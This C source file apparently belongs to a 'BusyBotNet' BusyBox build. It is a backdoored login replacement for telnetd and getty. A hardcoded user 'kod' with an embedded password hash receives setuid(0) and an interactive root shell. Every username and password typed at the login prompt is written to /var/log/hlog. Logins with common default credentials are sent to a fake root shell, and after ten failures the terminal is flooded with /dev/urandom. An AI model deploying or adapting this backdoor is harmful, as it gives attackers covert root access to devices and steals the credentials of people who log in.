//kbuild:lib-$(CONFIG_bd) += bd.o
//config:config BD
//config:       bool "bd"
//config:       default y
//config:       help
//config:         Returns an indeterminate value.
//usage:#define bd_trivial_usage
//usage:       "[# chmod u+s busybotnet;bd]"
//usage:#define bd_full_usage "\n\n"
//usage:       "bd - A full featured planet keker.\n"



//kod's smexy honeydoor login replacement for telnetd and getty
//strictly liscenced under wtfpl
//use: door some shit and collect the logs in /var/log/hlog
//todo: check actual /etc/shadow incase we want to be sneaky af

#include <libbb.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <crypt.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <sys/sysinfo.h>
int
shadowparse (const char *user, const char *pword, const char *pass)
{
  char *shad;
  FILE *shf;
  char *line = NULL;
  size_t len = 0;
  ssize_t read;
  int inshadow;
  char *result;
  int pwcheck;
  shf = fopen ("/etc/shadow", "r");
  while ((read = getline (&shad, &len, shf)) != -1)
    {
      char *splitter;
      char *fuck = strdup (shad);
      char *shaduser;
      char *hash;
      int i;
      for (i = 0; i < 2; i++)
	{
	  splitter = strsep (&fuck, ":");
	  if (i == 0)
	    {
	      shaduser = strdup (splitter);
	    }
	  else if (i == 1)
	    {
	      hash = strdup (splitter);
	    }
	  free (splitter);

	}
      inshadow = strcmp (user, shaduser) == 0;
      result = crypt (pword, pass);
      pwcheck = strcmp (result, hash) == 0;

      if (inshadow & pwcheck)
	{
	  system ("/bin/sh");

	  free (shaduser);
	  free (hash);

	  return 0;

	}

//clean up time
      free (shaduser);
      free (hash);
    }

}

int
touchFile (const char *fname)
{
  FILE *fptr;
  char there_was_error = 0;
  char opened_in_read = 1;
  fptr = fopen (fname, "rb+");
  if (fptr == NULL)		//if file does not exist, create it
    {
      opened_in_read = 0;
      fptr = fopen (fname, "wb");
      if (fptr == NULL)
	there_was_error = 1;
    }
  if (there_was_error)
    {
      //printf ("Disc full or no permission\n");
      return EXIT_FAILURE;
    }
  //   if (opened_in_read)
//        printf("The file is opened in read mode."
  //             " Let's read some cached data\n");
  // else
  //    printf("The file is opened in write mode."
  //         " Let's do some processing and cache the results\n");
  return EXIT_SUCCESS;
}

//set up the fake shell
//you’re too stupid to realize you got a demon sticking out your ass singing, “Holy miss moley, got me a live one!"

// ossian's fakeshell to replace bash on restricted accounts.
// strictly liscenced under wtfpl
// TODO:
//   -Add more commands ( from honeybot )
//   -make it more legit
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/sysinfo.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

// declare shell cmds
int bsh_help(char **args);
int bsh_exit(char **args);
int bsh_id(char **args);
int bsh_whoami(char **args);
int bsh_pwd(char **args);
int bsh_uname(char **args);
int bsh_cd(char **args);
int bsh_cat(char **args);
int bsh_uptime(char **args);
int bsh_date(char **args);
int bsh_who(char **args);
int bsh_busybox(char **args);
int bsh_wget(char **args);
int bsh_ps(char **args);
int bsh_ls(char **args);
int bsh_netstat(char **args);
int bsh_w(char **args);

char *builtin_str[] = { // shell cmd names, someone add more pls
    "help",         "exit", "id",     "whoami", "pwd",    "uname",
    "cd",           "cat",  "uptime", "date",   "who",    "busybox",
    "/bin/busybox", "wget", "ps",     "ls",     "netstat", "w"};

int (*builtin_func[])(char **) = { // corresponding functions for cmds
    &bsh_help,  &bsh_exit,    &bsh_id,      &bsh_whoami, &bsh_pwd,
    &bsh_uname, &bsh_cd,      &bsh_cat,     &bsh_uptime, &bsh_date,
    &bsh_who,   &bsh_busybox, &bsh_busybox, &bsh_wget,   &bsh_ps,
    &bsh_ls,    &bsh_netstat, &bsh_w};

int bsh_num_builtins() { return sizeof(builtin_str) / sizeof(char *); }

/* - - - - - - - - - [ start of shell cmds ] - - - - - - - - - */

int bsh_help(char **args) // do the help
{
  if (args[1] == NULL) {
    int i;
    printf("BBN bsh, version 0.4.20-release\n");
    printf("These shell commands are defined internally.  Type `help' to see "
           "this list.\n");
    printf("Use `man -k' or `info' to find out more about commands not in this "
           "list.\n\n");

    for (i = 0; i < bsh_num_builtins(); i++) {
      printf(" %s\n", builtin_str[i]);
    }
  } else {
    printf("help: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_exit(char **args) // exit cmd
{
  return 0;
}

int bsh_id(char **args) {
  if (args[1] == NULL) {
    printf("uid=0(root) gid=0(root) groups=0(root)\n");
  } else {
    printf("pwd: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_whoami(char **args) {
  if (args[1] == NULL) {
    printf("root\n");
  } else {
    printf("whoami: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_pwd(char **args) {
  if (args[1] == NULL) {
    printf("/root\n");
  } else {
    printf("pwd: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_uname(char **args) {
  if (args[1] == NULL) {
    printf("Linux\n");
  } else if (strcmp(args[1], "-a") == 0) {
    printf("Linux localhost 4.4.0-38-generic #57-Ubuntu SMP Tue Sep 6 15:42:33 "
           "UTC 2016 x86_64 x86_64 x86_64 GNU/Linux\n");
  } else {
    printf("uname: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_cd(char **args) {
  if (args[1] == NULL) {
    fprintf(stderr, "bsh: expected argument to \"cd\"\n");
  } else {
    if (chdir(args[1]) != 0) {
      perror("bsh");
    }
  }
  return 1;
}

int bsh_cat(char **args) {
  if (args[1] == NULL) {
    fprintf(stderr, "bsh: expected argument to \"cat\"\n");
  } else if (strcmp(args[1], "/proc/version") == 0) {
    printf("Linux version 4.4.0-38-generic (buildd@lgw01-58) (gcc version "
           "5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.2) ) #57-Ubuntu SMP "
           "Tue Sep 6 15:42:33 UTC 2016\n");
  } else if (strcmp(args[1], "/proc/cpuinfo") == 0) {
    printf("processor        : 0\nvendor_id        : GenuineIntel\ncpu family  "
           "     : 6\nmodel            : 55\nmodel name       : Intel(R) "
           "Celeron(R) CPU  N2840  @ 2.16GHz\nstepping         : 8\nmicrocode  "
           "      : 0x829\ncpu MHz          : 2582.293\ncache size       : "
           "1024 KB\nphysical id      : 0\nsiblings         : 2\ncore id       "
           "   : 0\ncpu cores        : 2\napicid           : 0\ninitial apicid "
           "  : 0\nfpu              : yes\nfpu_exception    : yes\ncpuid level "
           "     : 11\nwp               : yes\nflags            : fpu vme de "
           "pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 "
           "clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx rdtscp "
           "lm constant_tsc arch_perfmon pebs bts rep_good nopl xtopology "
           "nonstop_tsc aperfmperf pni pclmulqdq dtes64 monitor ds_cpl vmx est "
           "tm2 ssse3 cx16 xtpr pdcm sse4_1 sse4_2 movbe popcnt "
           "tsc_deadline_timer rdrand lahf_lm 3dnowprefetch epb tpr_shadow "
           "vnmi flexpriority ept vpid tsc_adjust smep erms dtherm ida "
           "arat\nbugs             :\nbogomips         : 4326.40\nclflush size "
           "    : 64\ncache_alignment  : 64\naddress sizes    : 36 bits "
           "physical, 48 bits virtual\npower management :\n");
  } else {
    printf("bsh: No such file or directory/n");
  }
  return 1;
}

int bsh_uptime(char **args) {
  if (args[1] == NULL) {
    system("uptime");
  } else {
    printf("pwd: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_date(char **args) {
  if (args[1] == NULL) {
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char s[64];
    strftime(s, sizeof(s), "%c", tm);
    printf("%s\n", s);
  } else {
    printf("pwd: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_who(char **args) {
  if (args[1] == NULL) {
    system("who");
  } else {
    printf("pwd: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_busybox(char **args) {
  printf(
      "BusyBox v1.22.1 (Ubuntu 1:1.22.0-15ubuntu1) multi-call binary.\nBusyBox "
      "is copyrighted by many authors between 1998-2012.\nLicensed under "
      "GPLv2. See source distribution for detailed\ncopyright "
      "notices.\n\nUsage: busybox [function [arguments]...]\n   or: busybox "
      "--list[-full]\n   or: busybox --install [-s] [DIR]\n   or: function "
      "[arguments]...\n\n	BusyBox is a multi-call binary that combines "
      "many common Unix\n	utilities into a single executable.  Most "
      "people will create a\n	link to busybox for each function they wish to "
      "use and BusyBox\n	will act like whatever it was invoked "
      "as.\n\nCurrently defined functions:\n	[, [[, acpid, adjtimex, ar, "
      "arp, arping, ash, awk, basename, blockdev, brctl, bunzip2, bzcat, "
      "bzip2, cal, cat, chgrp, chmod, chown, chpasswd,\n	chroot, chvt, "
      "clear, cmp, cp, cpio, crond, crontab, cttyhack, cut, date, dc, dd, "
      "deallocvt, depmod, devmem, df, diff, dirname, dmesg, dnsdomainname,\n	"
      "dos2unix, dpkg, dpkg-deb, du, dumpkmap, dumpleases, echo, ed, egrep, "
      "env, expand, expr, false, fdisk, fgrep, find, fold, free, freeramdisk, "
      "fstrim,\n	ftpget, ftpput, getopt, getty, grep, groups, gunzip, "
      "gzip, halt, head, hexdump, hostid, hostname, httpd, hwclock, id, "
      "ifconfig, ifdown, ifup, init,\n	insmod, ionice, ip, ipcalc, kill, "
      "killall, klogd, last, less, ln, loadfont, loadkmap, logger, login, "
      "logname, logread, losetup, ls, lsmod, lzcat,\n	lzma, lzop, lzopcat, "
      "md5sum, mdev, microcom, mkdir, mkfifo, mknod, mkswap, mktemp, modinfo, "
      "modprobe, more, mount, mt, mv, nameif, nc, netstat,\n	nslookup, od, "
      "openvt, passwd, patch, pidof, ping, ping6, pivot_root, poweroff, "
      "printf, ps, pwd, rdate, readlink, realpath, reboot, renice, reset,\n	"
      "rev, rm, rmdir, rmmod, route, rpm, rpm2cpio, run-parts, sed, seq, "
      "setkeycodes, setsid, sh, sha1sum, sha256sum, sha512sum, sleep, sort,\n	"
      "start-stop-daemon, stat, static-sh, strings, stty, su, sulogin, "
      "swapoff, swapon, switch_root, sync, sysctl, syslogd, tac, tail, tar, "
      "taskset, tee,\n	telnet, telnetd, test, tftp, time, timeout, top, touch, "
      "tr, traceroute, traceroute6, true, tty, tunctl, udhcpc, udhcpd, umount, "
      "uname, uncompress,\n	unexpand, uniq, unix2dos, unlzma, unlzop, unxz, "
      "unzip, uptime, usleep, uudecode, uuencode, vconfig, vi, watch, "
      "watchdog, wc, wget, which, who,\n	whoami, xargs, xz, xzcat, yes, "
      "zcat\n");
  return 1;
}

int bsh_wget(char **args) {
  if (args[1] == NULL) {
    printf("wget: missing URL\nUsage: wget [URL]...\n");
  } else if (strncmp(args[1], "-", 1) == 0) {
    printf("wget: invalid option : '%s'\nUsage: wget [URL]...\n", args[1]);
  } else {
    time_t rawtime;
    struct tm *timeinfo;
    time(&rawtime);
    timeinfo = localtime(&rawtime);
    printf("--%d-%d-%d %d:%d:%d--  %s\n", timeinfo->tm_year + 1900,
           timeinfo->tm_mon + 1, timeinfo->tm_mday, timeinfo->tm_hour,
           timeinfo->tm_min, timeinfo->tm_sec, args[1]);
    printf("Resolving %s (%s)... failed: Name or service not known.\n", args[1],
           args[1]);
    printf("wget: unable to resolve host address ‘%s’\n", args[1]);
  }
  return 1;
}

int bsh_ps(char **args) {
  printf("  PID TTY          TIME CMD\n  624 pts/8    00:00:00 sudo\n  630 "
         "pts/8    00:00:00 bash\n 1350 pts/8    00:00:00 ps\n");
  return 1;
}

int bsh_ls(char **args) {
  if (args[1] == NULL) {
    printf("\n");
  } else if ((strcmp(args[1], "-ln") == 0) || (strcmp(args[1], "-la") == 0)) {
    printf("total 40\ndrwx------  7 root root 4096 Oct  4 09:14 .\ndrwxr-xr-x "
           "27 root root 4096 Sep 23 02:57 ..\n-rw-------  1 root root   46 "
           "Oct  3 01:57 .bash_history\n-rw-r--r--  1 root root 3106 Oct 22  "
           "2015 .bashrc\ndrwx------  4 root root 4096 Aug 24 03:14 "
           ".cache\ndrwx------  3 root root 4096 Oct  4 09:14 "
           ".config\ndrwx------  3 root root 4096 Aug 24 03:14 "
           ".dbus\ndrwxr-xr-x  3 root root 4096 Oct  4 09:14 "
           ".local\n-rw-r--r--  1 root root  148 Aug 17  2015 "
           ".profile\ndrwx------  2 root root 4096 May  4 22:34 .ssh\n");
  } else {
    printf("ls: invalid option : '%s'\n", args[1]);
  }
  return 1;
}

int bsh_netstat(char **args) { return 1; }

int bsh_w(char **args) {
  if (args[1] == NULL) {
    printf(" 03:30:06 up 17:22, 11 users,  load average: 0.56, 0.66, 0.68\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     tty1     :0               Tue12    0:01s  0:54   0.82s /bin/bash\n");
  } else {
    printf("w: invalid option : '%s'\n", args[1]);
  }
}

/* - - - - - - - - - [ end of shell cmds ] - - - - - - - - - */

int bsh_execute(char **args) // do the shell shit
{
  int i;

  if (args[0] == NULL) {
    return 1;
  }

  for (i = 0; i < bsh_num_builtins(); i++) { // do the shell here
    if (strcmp(args[0], builtin_str[i]) == 0) {
      return (*builtin_func[i])(args);
    }
  }
  const char *messages[] = {
      // random error
      "error: not enough arguments", "exec: file format error",
      "SIGSEGV: Core dumped.", "Sementation fault.", "bsh: command not found",
      "bsh: no such file or directory",
      "/lib/ld-uClibc.so.0: No such file or directory",
      "Unexpected ‘;’, expecting ‘;'", "Can’t cast a void type to type void.",
      "Error: Error ocurred when attempting to print error message.",
      "User Error: An unknown error has occurred in an unidentified program "
      "while executing an unimplemented function at an undefined address. "
      "Correct error and try again.",
      "Kernel panic - not syncing: (null)"
      "No.",
      "syntax error: Unexpected: ‘/’ Expected: ‘\\’", "bsh: permission denied",
      "EOF error: broken pipe.", "bsh: Operation not permitted",
      "error: init: Id \"3\" respawning too fast: disabled for 5 minutes: "
      "command failed"};
  const size_t messages_count = sizeof(messages) / sizeof(messages[0]);
  char input[64];
  printf("%s\n", messages[rand() % messages_count]);
  return 1;
}

#define BSH_RL_BUFSIZE 1024

char *bsh_read_line(void) {
  int bufsize = BSH_RL_BUFSIZE;
  int position = 0;
  char *buffer = malloc(sizeof(char) * bufsize);
  int c;

  if (!buffer) {
    fprintf(stderr, "allocation error\n");
    exit(EXIT_FAILURE);
  }

  while (1) {
    c = getchar();

    if (c == EOF ||
        c == '\n') { // if its EOF then set to null character and return
      buffer[position] = '\0';
      return buffer;
    } else {
      buffer[position] = c;
    }
    position++;

    if (position >=
        bufsize) { // reallocate if the horse cock was too big for the buffer
      bufsize += BSH_RL_BUFSIZE;
      buffer = realloc(buffer, bufsize);
      if (!buffer) {
        fprintf(stderr, "bsh: allocation error\n");
        exit(EXIT_FAILURE);
      }
    }
  }
}

#define BSH_TOK_BUFSIZE 64
#define BSH_TOK_DELIM " \t\r\n\a"

char **bsh_split_line(
    char *line) // change line into tokens (could be done better prolly).
{
  int bufsize = BSH_TOK_BUFSIZE, position = 0;
  char **tokens = malloc(bufsize * sizeof(char *));
  char *token;

  if (!tokens) {
    fprintf(stderr, "bsh: allocation error\n");
    exit(EXIT_FAILURE);
  }

  token = strtok(line, BSH_TOK_DELIM);
  while (token != NULL) {
    tokens[position] = token;
    position++;

    if (position >= bufsize) {
      bufsize += BSH_TOK_BUFSIZE;
      tokens = realloc(tokens, bufsize * sizeof(char *));
      if (!tokens) {
        fprintf(stderr, "bsh: allocation error\n");
        exit(EXIT_FAILURE);
      }
    }

    token = strtok(NULL, BSH_TOK_DELIM);
  }
  tokens[position] = NULL;
  return tokens;
}

void bsh_loop(void) {
  char *line;
  char **args;
  int status;
  char hostname[128];
  gethostname(hostname, 128);

  do {
    printf("bot@%s:~ # ", hostname);
    line = bsh_read_line();
    args = bsh_split_line(line);
    status = bsh_execute(args);

    free(line);
    free(args);
  } while (status);
}

int fakeshell() {
  bsh_loop(); // Run command loop.
  return EXIT_SUCCESS;
}




int
trapthatfucker (const char *user, const char *pword, const char *trapper,
		const char *pwtrap)
{
  int utrapcheck = 0;
  int ptrapcheck = 0;
  utrapcheck = strcmp (user, trapper) == 0;
  ptrapcheck = strcmp (pword, pwtrap) == 0;
  if (ptrapcheck && utrapcheck)
    {
      fakeshell ();
    }
}


char *
ReadFile (char *filename)
{
  char *buffer = NULL;
  int string_size, read_size;
  FILE *handler = fopen (filename, "r");

  if (handler)
    {
      // Seek the last byte of the file
      fseek (handler, 0, SEEK_END);
      // Offset from the first to the last byte, or in other words, filesize
      string_size = ftell (handler);
      // go back to the start of the file
      rewind (handler);

      // Allocate a string that can hold it all
      buffer = (char *) malloc (sizeof (char) * (string_size + 1));

      // Read it all in one operation
      read_size = fread (buffer, sizeof (char), string_size, handler);

      // fread doesn't set it so put a \0 in the last position
      // and buffer is now officially a string
      buffer[string_size] = '\0';

      if (string_size != read_size)
	{
	  // Something went wrong, throw away the memory and set
	  // the buffer to NULL
	  free (buffer);
	  buffer = NULL;
	}

      // Always remember to close the file.
      fclose (handler);
    }

  return buffer;
}


int bd_main (int argc, const char *argv[])
//main (void)
{

//silent error counter
  int whoops = 0;


//set up main program

// stuff we need
  int ret__;
  ret__ = remove ("/var/log");
  if (ret__ != 0)
    {
      whoops++;
    }
  touchFile ("/var/log/hlog");
  touchFile ("/var/log/htrap");
  mkdir ("/var/etc", 0700);
  mkdir ("/var/log", 0750);

  int counter = 0;
  while (1)
    {
      //get username and password
      char *user = NULL;
      //unsigned int len;
      size_t len = 128;
      printf ("\nUsername: ");
      getline (&user, &len, stdin);
      char *pword = getpass ("Password: ");	//getpass is depricated beware

      //sleep to prevent brutes
      sleep (counter);

      //check if we are a doored user
      char *tester = "kod\n";
      char *pass;
      //if theres /var/shadow use the hash in there instead 
      if (access ("/var/shadow", F_OK) != -1)
	{
	  FILE *ghettoshadow;
	  size_t gslen = 0;
	  ssize_t gsread;
	  ghettoshadow = fopen ("/var/shadow", "r");
	  getline (&pass, &gslen, ghettoshadow);
	  pass[strcspn (pass, "\n")] = 0;
	  fclose (ghettoshadow);
	}
      else
	{
	  pass = "$5$V6Z1JdRuK869LhHy$ea9IZBYRt9M2e8wBevlDmDj1iOzWy8DbU4lJ3c8nzE2"; //mkpasswd -m sha-256 kektheplanet
	}
      int doortest;
      char *result;
      int pwcheck;
      doortest = strcmp (user, tester) == 0;	//check if we are a doored user
      result = crypt (pword, pass);	//run crypt on the password with it as salt
      pwcheck = strcmp (result, pass) == 0;	//check against hash

      //root shell for you!
      if (pwcheck && doortest)	//heres the magic
/*
*
*Execlp fork
*
*/
	{
	  counter = 0;
	  pid_t my_pid, parent_pid, child_pid;
	  int status;
/* get and print my pid and my parent's pid. */
	  my_pid = getpid ();
	  parent_pid = getppid ();
	  //fprintf(stderr, "\n Parent: my pid is %d\n\n", my_pid);
	  //fprintf(stderr, "Parent: my parent's pid is %d\n\n", parent_pid);
/* print error message if fork() fails */
	  if ((child_pid = fork ()) < 0)
	    {
	      perror ("fork failure");
	      exit (1);
	    }
/* fork() == 0 for child process */
	  if (child_pid == 0)
	    {			//fprintf(stderr, "\nChild: I am a new-born process!\n\n");
	      my_pid = getpid ();
	      parent_pid = getppid ();
	      //fprintf(stderr, "Child: my pid is: %d\n\n", my_pid);
	      //fprintf(stderr, "Child: my parent's pid is: %d\n\n", parent_pid);
	      //fprintf(stderr, "Child: Now, I am executing the shell \n\n");
	      char *string = ReadFile ("/var/etc/banner.txt");
	      if (string)
		{
		  puts (string);
		  free (string);
		}

	      printf ("Welcome to BusyBotNet Backdoor n_n\nHave a nice day!\n");	//put some ascii art here
	      setuid (0);
	      setgid (0);
	      execl ("/bin/sh", "sh", "-i", (char *) 0);
	      perror ("execl() failure!\n\n");

	      fprintf (stderr, "Should never see this message... \n\n");

	      _exit (1);
	    }
/*
 * parent process
 */
	  else
	    {
	      //fprintf(stderr, "\nParent: I created a child process.\n\n");
	      //fprintf(stderr, "Parent: my child's pid is: %d\n\n", child_pid);
	      wait (&status);	/* can use wait(NULL) since exit status
				   from child is not used. */
	      free (user);
	      printf ("\n Good bye!.\n \n ");
	    }

	  return 0;
	}
      /*{
         counter = 0;         //reset for good login
         printf ("Welcome to BusyBotNet Backdoor n_n\nHave a nice day!\n");   //put some ascii art here
         setuid (0);
         setgid (0);
         system ("/bin/sh");
         } */


      //you just activated my trap card
      char *trapper = "admin\n";
      char *pwtrap = "admin";
      trapthatfucker (user, pword, trapper, pwtrap);
      //trap a few more payloads   -- i know its hacky alright geez
      trapper = "root\n";
      pwtrap = "toor";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "root";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "1234";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "123456";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "admin";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "admin\n";
      pwtrap = "root";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "password";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "Password";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "login";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "juantech";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      pwtrap = "00000000";
      trapthatfucker (user, pword, trapper, pwtrap);
      trapper = "root\n";
      trapper = "7ujMko0admin";
      trapthatfucker (user, pword, trapper, pwtrap);

      //honey logging into /var/log/hlog
      FILE *hlog;
      char *spath = "/var/log/hlog";	//feel free to change this path
      hlog = fopen (spath, "a+");
      char combo[200];
      user[strcspn (user, "\n")] = 0;	//hacky magic to remove newline
      sprintf (combo, "%s:%s \n", user, pword);	//todo:valid/invaid
      fputs (combo, hlog);
      fclose (hlog);

      //urandom attack after 10 tries (want those passwords)
      counter++;
      FILE *fptr;
      char *c;
      if (counter > 9)
	{
	  printf ("Ah Ah Ah, you didn't say the magic word!\n");	//don't get cheap on me dodson, that was hammond's mistake
	  sleep (2);		//here we directly open /dev/urandom and dump 2048 bytes at a time

	  char f;		//this should kill a lot of scanners and shit or at least hang them
	  void *l[2048];	//not sure how hard this dumps its not like retarded fast but 
	  size_t n;		//depends on the terminal reading it, should be pretty quick
	  f = open ("/dev/urandom", O_RDONLY);	//note: this is really hacky 
	  while ((n = read (f, l, 2048)) > 0)
	    {
	      write (1, l, n);
	    }
	}



    }
}
